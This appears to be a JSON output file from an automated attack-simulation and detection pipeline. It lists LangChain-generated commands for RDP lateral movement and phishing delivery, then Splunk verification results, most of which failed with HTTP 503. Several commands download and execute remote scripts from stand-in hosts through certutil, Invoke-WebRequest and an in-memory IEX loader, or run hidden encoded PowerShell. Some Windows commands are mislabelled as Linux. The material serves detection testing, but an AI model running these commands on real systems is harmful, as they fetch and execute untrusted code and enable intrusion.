      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "8097a692-5481-45c0-8386-37370faeaded",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "xfreerdp /v:192.168.1.100 /port:3389",
      "description": "Basic RDP connection attempt to remote host on default port",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Initiates an RDP session to 192.168.1.100:3389. Prompts for credentials interactively. No data is transferred unless authenticated.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "6a501e4c-4c25-48de-9b61-4af2da2210ef",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "xfreerdp /v:192.168.1.100 /u:'testuser' /p:'testpass' /port:3389",
      "description": "RDP connection with embedded username and password",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to authenticate to the RDP service on 192.168.1.100 using provided credentials. Logs success or failure based on valid authentication.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "c764e70c-00cb-4ba7-b3e4-2768c9dc3b8d",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "xfreerdp /v:192.168.1.100 /u:'domain\\admin' /p:'pass123' /drive:'share,/tmp/mnt' /port:3389",
      "description": "Advanced RDP connection with disk drive redirection for potential data access",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Connects to remote RDP server and maps local directory /tmp/mnt as a drive in the session. This could be abused for lateral movement or data staging. Fails silently if service is unreachable or credentials invalid.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "92bbee22-551a-43d2-b3e8-875abb3df809",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://example.com/test.doc\" \"%TEMP%\\invoice.doc\" && start \"\" \"%TEMP%\\invoice.doc\"",
      "description": "Download a document file using certutil and open it to simulate a phishing payload delivery.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file named 'invoice.doc' to the user's temp directory and opens it with the default application. Uses built-in certutil for download and start command for execution. Simulates user opening a phishing document.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.215083",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "e3815d68-37a6-42ca-8473-657fd3a59e2c",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "echo Write-Host 'This is a test document. Please ignore.' > \"%TEMP%\\update.ps1\" && powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%TEMP%\\update.ps1\"",
      "description": "Create a benign PowerShell script in temp folder and execute it hidden to simulate a hidden script execution from phishing.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a harmless PowerShell script that displays a test message, then runs it in a hidden window. Mimics execution of a malicious script dropped by a phishing email.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.215083",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "335c39e7-f9f3-4202-94c1-7b970ee0398c",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"try { $cmd = 'echo Your system requires an update. Check C:\\\\Temp for details.; notepad.exe %TEMP%\\\\phishing_note.txt'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { }\"",
      "description": "Execute an encoded PowerShell command that simulates displaying a phishing message and opening a note file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a benign command prompting the user to check a file, then executes it in a hidden PowerShell window. Simulates execution of encoded commands often seen in phishing lures. Uses proper UTF-16LE encoding for compatibility.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.215083",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "e2282095-4f98-4734-9a89-7b7501fa02b0",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.168.1.100/agent.txt' -OutFile '$env:TEMP\\update.ps1'; if (Test-Path '$env:TEMP\\update.ps1') { . '$env:TEMP\\update.ps1' }\"",
      "description": "Download a PowerShell script via HTTP and execute it locally, simulating a phishing payload delivery.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file named 'update.ps1' from a remote server to the user's temp directory and executes it. If the file does not exist or server is unreachable, no action is taken.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "8fcd19f8-4b75-4085-8ac4-41e895a98a28",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "certutil.exe -urlcache -split -f \"http://malicious.local/payload.txt\" \"%TEMP%\\launcher.bat\" && \"%TEMP%\\launcher.bat\"",
      "description": "Use certutil to download a batch script and execute it, a common method in phishing attacks to bypass execution policy.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a remote URL to the temp directory as 'launcher.bat' and runs it. If the file fails to download, the execution step is skipped.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "1a8bacba-8e20-4c57-bf5a-da03d78ec8ff",
      "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "powershell -EncodedCommand \"IEX (New-Object Net.WebClient).DownloadString('http://test.com/start.txt')\"",
      "description": "Execute a remote PowerShell script directly in memory using an encoded command, simulating advanced phishing payload execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and executes a PowerShell command that downloads and runs a script from a remote server. This occurs entirely in memory without dropping a file to disk.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.621,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "2a7c1038-f19a-44be-bc73-504944d332eb",
      "ttp_id": "T1090",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "dbd6adf8-efa0-42f5-aeac-1e9dfd51734e",
      "ttp_id": "T1204",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "cf08cb32-13ae-4433-989c-45bed61c6875",
      "ttp_id": "T1190",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "079b1951-e2a1-4b5c-bf55-e9c180cc6fdc",
      "ttp_id": "T1027",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "602afb2e-641c-432f-8b12-b59e95703fe8",
      "ttp_id": "T1083",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "80e755a5-b68d-4c25-8fa7-02c111cc67ca",
      "ttp_id": "T1071",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "29832b84-6093-45f6-8d1f-84016ff74918",
      "ttp_id": "T1059",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "00f61d5c-f6cb-40f1-97d0-24a2134ecffa",
      "ttp_id": "T1041",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "c86cd384-4447-44bb-966d-24886ec8ed48",
      "ttp_id": "T1082",
      "detected": true,
      "events_found": 304,
      "query_time_ms": 628.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a177a58b-40b1-4adb-90a8-cebc1a732b1d",
      "ttp_id": "T1072",
      "detected": true,
      "events_found": 280,
      "query_time_ms": 505.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "76ee7751-4b40-4551-9eab-b1876fadd242",
      "ttp_id": "T1543",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "420ad135-fc97-466a-b9ba-690a3a5b9363",
      "ttp_id": "T1055",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "05c5655e-368c-421d-b843-3550ec973449",
      "ttp_id": "T1560",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "74d16de2-29fe-44bf-a980-d33988a95798",
      "ttp_id": "T1087",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "179236c1-0af1-42a6-ac9d-fc6715c593a8",
      "ttp_id": "T1547.001",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "f7be34ad-ace6-4e71-bd8c-4bcc5829829c",
      "ttp_id": "T1021.001",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTP 503"
    },
    {
      "rule_id": "49fecd96-257b-42b8-a422-00866c918f7b",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 132,
      "query_time_ms": 610.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 3,
    "false_positives": 0,
    "false_negatives": 14,
    "precision": 1.0,
    "detection_rate": 0.17647058823529413,
    "f1_score": 0.3
  },
  "iterations": 1,
  "final_score": 0.6397058823529411,
  "final_report": {
    "total_ttps": 23,
    "optimized_ttps": 17,
    "generated_rules": 17,
    "generated_attacks": 96,
    "timestamp": "2025-12-28T22:04:27.775353"
  },
  "timestamp": "2025-12-28T22:04:27.775353",
  "benchmark_metrics": {
    "duration_s": 1071.8710033893585,
    "quality_score": 0.604702818627451
  }
}